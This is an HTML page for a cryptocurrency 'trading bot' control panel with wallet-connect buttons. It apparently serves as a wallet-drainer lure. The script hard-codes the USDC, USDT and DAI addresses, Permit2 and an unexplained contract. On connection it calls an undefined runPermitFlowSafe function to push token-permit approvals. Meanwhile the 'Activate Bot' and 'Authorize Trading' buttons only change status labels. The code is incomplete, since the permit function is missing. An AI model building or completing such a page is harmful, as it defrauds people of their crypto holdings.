<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Bot Control Standalone</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

<style>
:root {
    --bg: #020617;
    --panel: rgba(15, 23, 42, 0.85);
    --border: #1e293b;
    --cyan: #06b6d4;
    --green: #10b981;
    --purple: #6366f1;
    --amber: #f59e0b;
    --orange: #f97316;
    --font: 'JetBrains Mono', monospace;
}

* { box-sizing: border-box; margin:0; padding:0; }

body {
    background-color: var(--bg);
    color: white;
    font-family: var(--font);
    padding: 12px;
}

.panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 10px;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    backdrop-filter: blur(8px);
    margin-bottom:12px;
}

.panel-header {
    background: rgba(30, 41, 59, 0.6);
    padding: 8px 15px;
    font-size: 0.65rem;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 2px;
    border-bottom: 1px solid var(--border);
    color: var(--cyan);
}

.module-body {
    padding: 12px 15px;
}

.btn-stack {
    display: flex;
    flex-direction: column;
    gap: 8px;
    margin-bottom: 12px;
}

.control-btn {
    background: transparent;
    border: 1px solid var(--border);
    color: #64748b;
    padding: 10px;
    font-family: var(--font);
    font-size: 0.65rem;
    cursor: pointer;
    text-align: left;
    text-transform: uppercase;
    font-weight: bold;
}

.control-btn:not(:disabled):hover {
    background: rgba(255,255,255,0.05);
    border-color: currentColor;
}

.btn-cyan { color: var(--cyan); }
.btn-purple { color: var(--purple); }
.btn-amber { color: var(--amber); }

.status-box { border-top: 1px solid var(--border); padding-top: 8px; }

.status-grid {
    display: grid;
    grid-template-columns: 1fr 110px;
    gap: 5px;
    font-size: 0.6rem;
    align-items: center;
    margin-bottom: 4px;
}

.status-line {
    display: flex;
    align-items: center;
    gap: 8px;
}

.liveDot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
}

#execution-console {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    padding: 10px;
}

.exec-line {
    font-size: 0.58rem;
    margin-bottom: 2px;
    white-space: pre-wrap;
    word-break: break-all;
    width: 100%;
    line-height: 1.4;
    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
    font-family: 'JetBrains Mono', monospace;
}
</style>
</head>

<body>

<div class="panel">
    <div class="panel-header">Bot Control</div>
    <div class="module-body">

        <div class="btn-stack">
            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
    4. Disconnect Wallet
</button>
        </div>

        <div class="status-box">
            <div class="status-grid">
                <span>WALLET STATUS</span>
                <div class="status-line">
                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
                </div>
            </div>

            <div class="status-grid">
                <span>BOT STATUS</span>
                <div class="status-line">
                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
                    <span id="st-bot" style="color:#475569">OFFLINE</span>
                </div>
            </div>

            <div class="status-grid">
                <span>TRADING ACCESS</span>
                <div class="status-line">
                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
                    <span id="st-access" style="color:#475569">RESTRICTED</span>
                </div>
            </div>
        </div>

    </div>
</div>

<div class="panel" style="height:150px;">
    <div class="panel-header">Execution Console</div>
    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>

<script>
const TOKENS = [
 "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
 "0xdac17f958d2ee523a2206206994597c13d831ec7",
 "0x6b175474e89094c44da98b954eedeac495271d0f"
];

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0x2776a9e675B2123278b975b68586Ee40ACC0A9d2";

let APP_STATE = { wallet:null, botActive:false, authorized:false };
if (window.ethereum) {
  window.ethereum.on('accountsChanged', () => location.reload());
  window.ethereum.on('chainChanged', () => location.reload());
}

function log(msg){
 console.log(msg);
 const el=document.getElementById('execution-console');
 if(!el) return;
 const div=document.createElement('div');
 div.className='exec-line';
 div.innerText=msg;
 el.prepend(div);
}

function updateStatus(dotId, textId, text, color){
 const dot = document.getElementById(dotId);
 const label = document.getElementById(textId);
 dot.style.background = color;
 dot.style.boxShadow = `0 0 12px ${color}`;
 label.innerText = text;
 label.style.color = color;
}

async function connectWallet(){
 try{
 if (typeof window.ethereum === "undefined") {
    const install = confirm("MetaMask is not installed. Install?");
    if (install) window.location.href = "https://metamask.io/download/";
    return;
  }

  const provider=new ethers.BrowserProvider(window.ethereum);
  log("🔌 Requesting wallet connection...");
  await provider.send("eth_requestAccounts",[]);

  const signer=await provider.getSigner();
  const user=await signer.getAddress();
  const network = await provider.getNetwork();

if (network.chainId !== 1n) {
  log("❌ Wrong network");
  alert("Switch to Ethereum Mainnet");
  return;
}

  APP_STATE.wallet=user;
  renderWallet(user);

  document.getElementById('btn-wallet').disabled=true;
  document.getElementById('btn-activate').disabled=false;
  document.getElementById('btn-disconnect').disabled=false;

  await runPermitFlowSafe(provider, signer, user);

 }catch(e){
  log("ERR "+e.message);
 }
}



function renderWallet(address) {
 document.getElementById('btn-wallet').innerText = address;
 updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
}

function activateBot() {
 updateStatus('dot-bot','st-bot','READY','#6366f1');
}

function authorizeTrading() {
 updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b');
}

function disconnectWallet() {
 location.reload();
}

window.connectWallet = connectWallet;

</script>
</body>
</html>
